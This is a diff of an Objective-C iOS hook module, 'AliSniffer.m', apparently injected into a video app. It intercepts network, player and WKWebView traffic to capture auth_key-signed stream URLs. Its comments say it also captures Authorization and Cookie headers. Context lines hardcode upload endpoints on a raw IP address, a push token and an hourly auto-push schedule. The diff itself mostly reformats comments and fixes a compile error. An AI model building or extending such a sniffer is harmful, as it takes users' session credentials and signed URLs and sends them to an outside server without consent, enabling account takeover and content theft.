@@ -1,7 +1,15 @@
-//
+
 //  AliSniffer.m — 全面兜底增强版（auth_key 直通 + 多入口 + 大首包 + MSE/WebSocket/Metrics）
-//  说明：在你之前合并版的基础上做了大量增强，旨在把“能看见的直播链接/证据”尽量都抓到。
-//  替换或合并到你现有工程即可（记得调整 fishhook 路径与宏）。
+//  已修复 GitHub Actions 上编译报错的问题（ShowPopupIfNeeded 内部不再修改参数变量）
+//
+//  功能:
+//  - 只要 URL 含 auth_key 就直通上报 (优先级高，2 秒短去重，覆盖无 auth 版本)
+//  - 常规可播放 URL (m3u8, flv, mp4, rtmp, ws-flv) + 白名单域名也会上报
+//  - NSURLSessionTask, NSURLProtocol, CFReadStream, AVPlayer, AVURLAsset, replaceCurrentItem, playImmediatelyAtRate
+//  - WKWebView 注入 (fetch/XHR + MSE appendBuffer)
+//  - 扩大首包嗅探到 128KB，150ms 延时判定
+//  - Headers 一并抓取并推送 (Authorization/Cookie 等)
+//  - 保留弹窗提示 (可关闭宏)
 //
 
 #import <Foundation/Foundation.h>
@@ -16,8 +24,8 @@
 static NSString * const kPushRawEndpoint  = @"http://139.155.57.242:8088/api/push_raw";
 static NSString * const kPushFormEndpoint = @"http://139.155.57.242:8088/api/push_form";
 static NSString * const kPushToken        = @"@Yy166431";
-static const NSTimeInterval kPushInterval = 3600.0; // 每小时自动推送
-static NSString *g_lastPlayableURL = nil;           // 最近一次命中的播放 URL
+static const NSTimeInterval kPushInterval = 3600.0;
+static NSString *g_lastPlayableURL = nil;
 
 // 调试日志
 #ifndef ENABLE_DEBUG_LOG
@@ -31,7 +39,7 @@ static NSString *g_lastPlayableURL = nil;           // 最近一次命中的播�
 #define SNIFFER_ENABLE_POPUP 1
 #endif
 
-// iOS16 某些 Hook 默认为关闭，按需打开
+// iOS16 默认关闭的敏感 Hook
 #ifndef SNIFFER_IOS16_ENABLE_NSURLPROTOCOL
 #define SNIFFER_IOS16_ENABLE_NSURLPROTOCOL 1
 #endif
@@ -42,11 +50,11 @@ static NSString *g_lastPlayableURL = nil;           // 最近一次命中的播�
 #define SNIFFER_IOS16_ENABLE_LIBCURL 0
 #endif
 
-// 首包嗅探参数（增强）
-static const NSUInteger kFirstPacketMaxBytes = 128 * 1024; // 128KB
-static const NSTimeInterval kFirstPacketDelayMs = 0.15;   // 150 ms 判定延迟
+// 首包嗅探参数
+static const NSUInteger kFirstPacketMaxBytes = 128 * 1024;
+static const NSTimeInterval kFirstPacketDelayMs = 0.15;
 
-// ====== 噪声/白名单（保留） ======
+// ====== 噪声/白名单 ======
 static NSArray<NSString *> *BlockedSubstrings(void) {
     static NSArray *a; static dispatch_once_t once;
     dispatch_once(&once, ^{ a = @[@"log.aliyuncs.com/logstores", @"/beacon", @"/monitor", @"/ums", @"/umeng", @"/collect", @"bugly", @"crash", @"analytics", @"sentry"]; });
@@ -70,13 +78,13 @@ static inline BOOL IsNoise(NSString *lower) {
 static inline BOOL IsPlayableBySuffixOrWhiteHost(NSString *u) {
     if (u.length == 0) return NO;
     NSString *s = u.lowercaseString;
-    if ([s containsString:@"m3u8"] || [s containsString:@".mp4"] || [s containsString:@".flv"] || [s hasPrefix:@"rtmp://"] || [s hasPrefix:@"rtmps://"] || (([s hasPrefix:@"ws://"] || [s hasPrefix:@"wss://"]) && [s containsString:@".flv"])) return YES;
+    if ([s containsString:@"m3u8"] || [s containsString:@".mp4"] || [s containsString:@".flv"] ||
+        [s hasPrefix:@"rtmp://"] || [s hasPrefix:@"rtmps://"] ||
+        (([s hasPrefix:@"ws://"] || [s hasPrefix:@"wss://"]) && [s containsString:@".flv"])) return YES;
     NSString *h = HostOfURLString(s);
     for (NSString *w in WhitelistedHosts()) if ([h hasSuffix:w]) return YES;
     return NO;
 }
-
-// 新增：auth_key 检测 与 baseKey
 static inline BOOL HasAuthKey(NSString *lower) {
     if (!lower) return NO;
     return ([lower containsString:@"auth_key="] || [lower containsString:@"authkey="]);
@@ -89,7 +97,7 @@ static inline NSString *BaseURLWithoutQuery(NSString *s) {
     return c.string ?: s;
 }
 
-// ====== 去重 与 缓存 ======
+// ====== 去重 ======
 static NSMutableDictionary<NSString*, NSDate*> *g_seen;
 static inline BOOL SeenRecently(NSString *k, NSTimeInterval sec) {
     static dispatch_once_t once; dispatch_once(&once, ^{ g_seen = [NSMutableDictionary dictionary]; });
@@ -102,10 +110,10 @@ static inline BOOL SeenRecently(NSString *k, NSTimeInterval sec) {
 static inline void ShowPopupIfNeeded(NSString *title, NSString *url) {
 #if SNIFFER_ENABLE_POPUP
     dispatch_async(dispatch_get_main_queue(), ^{
-        if (!url) url = @"";
-        UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:url preferredStyle:UIAlertControllerStyleAlert];
+        NSString *msg = url ?: @"";
+        UIAlertController *ac = [UIAlertController alertControllerWithTitle:title message:msg preferredStyle:UIAlertControllerStyleAlert];
         [ac addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
-            if (url.length) [UIPasteboard generalPasteboard].string = url;
+            if (msg.length) [UIPasteboard generalPasteboard].string = msg;
         }]];
         [ac addAction:[UIAlertAction actionWithTitle:@"关闭" style:UIAlertActionStyleCancel handler:nil]];
         UIWindow *win = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
